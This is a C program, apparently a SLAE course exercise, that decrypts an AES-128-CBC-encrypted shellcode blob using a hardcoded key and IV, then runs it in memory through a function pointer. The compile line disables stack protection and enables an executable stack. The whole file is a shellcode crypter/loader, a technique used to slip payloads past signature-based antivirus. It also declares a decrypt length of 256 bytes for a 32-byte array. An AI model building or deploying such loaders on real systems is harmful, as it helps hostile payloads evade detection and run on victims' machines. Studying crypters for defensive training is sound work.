#include <stdio.h>

#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>


/**
 * decrypt.c
 * Student Id: SLAE-1058
 * Original version from:
 * 	-> https://gist.github.com/bricef/2436364
 * compile: gcc test.c -o test /usr/lib/libmcrypt.a  -z execstack -fno-stack-protector
 * */


/**
 * If the encrypted shellcode has any null byte, 
 * we can't get the strlen closest to 16 multiple (as we did in encrypter.c) using
 * our get_dynamic_length() function showed in encrypter.c. So we define the next constant
 * which maybe modified depending of the shellcode length of the encrypter output
 * 
 * */
#define SHELLCODE_LENGTH 256		// Put here the output length from the encrypter



void print_shellcode(unsigned char *shellcode, int len) {
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}


int decrypt(
	void* buffer,
	int buffer_len,
	char* IV,
	char* key,
	int key_len
){
	MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
	int blocksize = mcrypt_enc_get_block_size(td);
	if( buffer_len % blocksize != 0 ){return 1;}
	mcrypt_generic_init(td, key, key_len, IV);
	mdecrypt_generic(td, buffer, buffer_len);
	mcrypt_generic_deinit (td);
	mcrypt_module_close(td);
	return 0;
}


int main(int argc, char **argv)
{

	MCRYPT td, td2;

	char* IV = "AAAAAAAAAAAAAAAA";		//16
	char *key = "0123456789abcdef";		//16
	int keysize = 16; /* 128 bits */
	
	unsigned char shellcode[] = \
	"\x5c\xd8\xcf\x9e\x8f\x3a\x9f\x52\x2e\x3d\x51\x06\x00\xde"
	"\xa6\x64\x45\x5f\x62\x53\x75\xab\xbd\xe1\x33\xc1\x69\xbf"
	"\xed\xc8\x5c\xaa";
	
	decrypt(shellcode, SHELLCODE_LENGTH, IV, key, keysize);
	
	printf("[x] Trying to decrypt the shellcode ...\n");
	
	printf("[x] Decrypted size: %d\n", strlen(shellcode));
	printf("[x] Executing ...\n");
	int (*ret)() = (int(*)())shellcode;
	ret();
	
	return 0;
}
